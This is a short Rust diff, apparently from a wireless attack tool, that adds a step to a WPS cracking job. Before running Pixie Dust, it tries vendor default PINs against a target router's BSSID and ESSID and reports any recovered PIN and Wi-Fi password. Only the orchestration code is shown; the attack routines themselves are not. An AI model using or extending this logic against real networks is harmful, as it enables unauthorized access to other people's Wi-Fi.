@@ -339,12 +339,20 @@ fn run_attack_job(
         }
         netspecter_common::scheduler::AttackKind::WpsPixieDust => {
             // Cheapest first: the historic NULL PIN (instant when accepted),
+            // then vendor default PINs (instant on unrotated routers),
             // then Pixie Dust against a synthetic exchange.
             let null = backend::wps::try_null_pin(&job.bssid);
             if let Some(pin) = null.pin {
                 return (
                     AttackJobStatus::Cracked,
                     Some(format!("WPS PIN {pin}{}", null.psk.map(|p| format!(" PSK {p}")).unwrap_or_default())),
+                );
+            }
+            let defaults = backend::wps::try_default_pins(&job.bssid, &job.essid);
+            if let Some(pin) = defaults.pin {
+                return (
+                    AttackJobStatus::Cracked,
+                    Some(format!("WPS PIN {pin}{} (factory default — never rotated)", defaults.psk.map(|p| format!(" PSK {p}")).unwrap_or_default())),
                 );
             }
             let pixie = backend::wps::try_pixie_dust(&job.bssid, &[], &[]);
